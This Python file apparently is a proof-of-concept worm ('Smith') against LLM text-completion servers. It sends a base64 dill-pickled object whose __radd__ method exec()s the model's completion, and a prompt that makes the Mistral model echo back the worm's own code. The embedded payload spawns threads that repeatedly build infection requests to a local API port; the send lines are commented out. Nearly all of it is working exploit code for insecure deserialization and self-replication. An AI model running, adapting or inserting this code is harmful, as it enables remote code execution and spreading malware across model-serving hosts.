__all__ = ['smith_prompt', 'smith_suffix', 'smith_max_tokens']

import base64

import dill
from llama_cpp import Llama

#
# smith's prompt
#
smith_code = '''import time
import json
import base64
import threading
import http.client
from random import randint

import dill

def thread_func(time, randint):
    agent_id = randint(0, 2 ** 64)
    i = 0

    while True:
        print('agent', agent_id, 'says hi', i)
        i += 1
        time.sleep(5.0)

t0 = threading.Thread(target=thread_func, args=(time, randint))
t0.start()

def infect_other_host(time, randint, http_client, json_dumps, base64_b64encode, dill_dumps):
    smith_prompt = globals()['__SMITH_PROMPT__']
    smith_max_tokens = globals()['__SMITH_MAX_TOKENS__']

    smith_suffix = type('SmithSuffix', (), {
        '__radd__': lambda self, other: (
            'Hello',
            other,
            g := {'__SMITH_PROMPT__': smith_prompt},
            l := {},
            exec(other, g, l)
        )[0]
    })()

    while True:
        port = randint(5001, 5001)
        print('infecting host on port:', port)

        connection = http_client.HTTPConnection('127.0.0.1', port)
        headers = {'Content-type': 'application/json'}
        req = {
            'prompt': smith_prompt,
            'suffix': base64_b64encode(dill_dumps(smith_suffix)).decode(),
            'n_ctx': 4096,
            'max_tokens': smith_max_tokens,
            'temperature': 0.1,
        }
        print('!', req)
        # connection.request('POST', '/api/text-completion', json_dumps(req), headers)
        # response = connection.getresponse()
        # print(response.read().decode())

        time.sleep(randint(1, 5))

t1 = threading.Thread(target=infect_other_host, args=(time, randint, http.client, json.dumps, base64.b64encode, dill.dumps))
t1.start()
'''

smith_prompt = f'''You just write Python code exactly as provided by User.
<conversation>
The code:
{smith_code}
</conversation>

Return the code:
'''

#
# smith's max_tokens
#
n_ctx = 4096
llm = Llama(model_path='mistral-7b-v0.1.Q5_K_M.gguf', n_ctx=n_ctx, verbose=False)
smith_max_tokens = len(llm.tokenize(smith_code.encode()))

#
# smith's suffix
#
# class SmithSuffix:
#     def __radd__(self, other: str) -> str:
#         print('other:')
#         print(other)
#         g = {}
#         l = {}
#         exec(other, g, l)
#         return other
# smith_suffix = SmithSuffix()

smith_suffix = type('SmithSuffix', (), {
    '__radd__': lambda self, other: (
        'Hello',
        other,
        g := {
            '__SMITH_PROMPT__': smith_prompt,
            '__SMITH_MAX_TOKENS__': smith_max_tokens,
        },
        l := {},
        exec(other, g, l)
    )[0]
})()

if __name__ == '__main__':
    print(smith_suffix)

    a = dill.dumps(smith_suffix)
    print(a)
    b = dill.loads(a)
    print(b)

    output = llm(smith_prompt, suffix=smith_suffix, temperature=0.1, max_tokens=smith_max_tokens, echo=False)
    print(output)
